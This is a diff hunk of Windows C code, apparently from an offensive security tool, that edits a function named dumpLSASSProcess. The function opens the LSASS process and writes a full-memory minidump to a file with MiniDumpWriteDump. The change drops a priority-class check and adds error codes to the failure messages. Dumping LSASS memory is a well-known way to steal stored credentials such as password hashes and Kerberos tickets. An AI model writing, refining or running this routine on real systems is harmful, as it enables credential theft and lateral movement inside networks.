@@ -70,32 +70,24 @@ DWORD WINAPI dumpLSASSProcess(void* data) {
             continue;
         }
 
-        // Retrieve the priority class.
-        dwPriorityClass = 0;
         hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
         if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
-            _tprintf(TEXT("[!] LSASS dump failed: couldn't open lsass memory (OpenProcess)\n"));
+            _tprintf(TEXT("[!] LSASS dump failed: couldn't open lsass memory (OpenProcesswith error 0x%x)\n"), GetLastError());
             return 1;
         }
 
-        else {
-            dwPriorityClass = GetPriorityClass(hProcess);
-            if (!dwPriorityClass) {
-                _tprintf(TEXT("[!] LSASS dump non fatal error: couldn't retrieve LSASS process' priority class (GetPriorityClass)\n"));
-            }
-            HANDLE hDumpFile = CreateFile(outputDump, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-            if (hDumpFile == INVALID_HANDLE_VALUE) {
-                _tprintf(TEXT("[!] LSASS dump failed: couldn't create dump file (CreateFileA)\n"));
-                return 1;
-            }
-            BOOL dumped = MiniDumpWriteDump(hProcess, pe32.th32ProcessID, hDumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
-            if (!dumped) {
-                _tprintf(TEXT("[!] LSASS dump failed: couldn't dump LSASS process (MiniDumpWriteDump)\n"));
-                return 1;
-            }
-            _tprintf(TEXT("[+] LSASS sucessfully dump to: %s\n"), outputDump);
-            CloseHandle(hProcess);
+        HANDLE hDumpFile = CreateFile(outputDump, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hDumpFile == INVALID_HANDLE_VALUE) {
+            _tprintf(TEXT("[!] LSASS dump failed: couldn't create dump file (CreateFileA)\n"));
+            return 1;
         }
+        BOOL dumped = MiniDumpWriteDump(hProcess, pe32.th32ProcessID, hDumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+        if (!dumped) {
+            _tprintf(TEXT("[!] LSASS dump failed: couldn't dump LSASS process (MiniDumpWriteDump with error 0x%x)\n"), GetLastError());
+            return 1;
+        }
+        _tprintf(TEXT("[+] LSASS sucessfully dump to: %s\n"), outputDump);
+        CloseHandle(hProcess);
 
     } while (Process32Next(hProcessSnap, &pe32));
 
